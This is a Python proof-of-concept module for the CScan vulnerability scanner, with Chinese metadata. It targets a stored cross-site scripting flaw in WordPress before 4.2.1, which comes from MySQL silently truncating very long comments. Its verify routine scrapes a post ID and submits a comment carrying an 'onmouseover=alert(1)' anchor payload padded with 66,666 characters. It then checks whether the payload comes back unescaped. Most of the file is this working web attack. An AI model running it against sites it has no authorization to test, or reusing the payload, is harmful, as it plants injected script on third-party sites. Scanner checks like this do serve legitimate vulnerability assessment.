# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import random
import string
import requests


class Vuln(ABVuln):
    vuln_id = 'WordPress_0008'  # 平台漏洞编号，留空
    name = 'WordPress 存储型XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-04-27'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        在wordpress wp_comments表中存储留言的列为comment_content，他的类型为text。
        Text最大可以存储64kb的数据，如果用户输入了大于64kb的数据，mysql的做法依然是将后面的内容截断，
        由于wordpress并没有限制留言内容的长度，所以当我们提交大于64kb的留言内容时，
        依然可以造成页面布局的混乱，形成xss。
    '''  # 漏洞描述
    ref = 'http://www.freebuf.com/news/65926.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = '<4.2.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f38df895-37c4-4840-abc1-840757656caf'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = self.target + "/wp-comments-post.php"

            def rand_str(length): return ''.join(
                random.sample(string.ascii_letters, length))

            post_id = ''
            try:
                post_id = re.search(r'post-(?P<post_id>[\d]+)',
                                    requests.get(self.target).text)
                if post_id:
                    post_id = post_id.group('post_id')
            except Exception as e:
                self.output.info('执行异常{}'.format(e))

            ttys = "<a title='tmp style=cscan onmouseover=alert(1)// %s'>tmp@cscan</a>"
            flag = 'A' * 66666
            payload = {
                'author': rand_str(10),
                'email': '%s@%s.com' % (rand_str(10), rand_str(3)),
                'url': 'http://www.cscan.cn',
                'comment': ttys % flag,
                'comment_post_ID': post_id,
                'comment_parent': 0,
            }
            content = requests.post(verify_url, data=payload).text
            if '<a title=&#8217;tmp style=cscan onmouseover=alert(1)//' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
